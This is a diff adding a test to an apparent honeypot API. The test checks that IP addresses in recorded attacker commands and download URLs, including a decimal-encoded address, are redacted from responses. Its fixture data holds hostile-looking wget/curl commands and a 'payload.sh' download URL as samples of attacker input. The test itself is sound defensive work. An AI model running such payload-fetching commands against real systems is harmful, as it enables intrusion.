@@ -258,6 +258,58 @@ def test_list_sessions_filters_no_src_ip_leak(client: Any, seed_data: Any) -> No
     assert b"src_ip" not in response.data
 
 
+def test_session_detail_redacts_ips_in_commands_and_downloads(
+    client: Any, db_session: Any
+) -> None:
+    """C2 / payload IPs an attacker typed must be blotted server-side, so the raw
+    IP never reaches the API response (nor /redoc, /swagger, or a direct curl)."""
+    from datetime import datetime, timezone
+
+    from src.models.command import Command
+    from src.models.download import Download
+    from src.models.session import Session as HoneypotSession
+
+    now = datetime.now(timezone.utc)
+    db_session.add(
+        HoneypotSession(
+            id="sessIP00001",
+            src_ip="203.0.113.50",
+            src_port=4,
+            dst_port=22,
+            protocol="ssh",
+            started_at=now,
+        )
+    )
+    db_session.flush()
+    db_session.add(
+        Command(
+            session_id="sessIP00001",
+            input="wget https://34.11.136.102/x; curl http://2130706433/y",
+            success=True,
+            timestamp=now,
+        )
+    )
+    db_session.add(
+        Download(
+            session_id="sessIP00001",
+            url="http://185.220.101.5:8080/payload.sh",
+            outfile="downloads/p",
+            sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+            timestamp=now,
+        )
+    )
+    db_session.flush()
+
+    response = client.get("/api/v1/sessions/sessIP00001")
+    assert response.status_code == 200
+    # No IP literal of any kind survives in the raw response bytes.
+    for leaked in (b"34.11.136.102", b"2130706433", b"185.220.101.5"):
+        assert leaked not in response.data, leaked
+    body = response.get_json()
+    assert "‹ip›" in body["commands"][0]["input"]
+    assert "‹ip›" in body["downloads"][0]["url"]
+
+
 def test_get_session_not_found(client: Any) -> None:
     response = client.get("/api/v1/sessions/nonexistent")
     assert response.status_code == 404
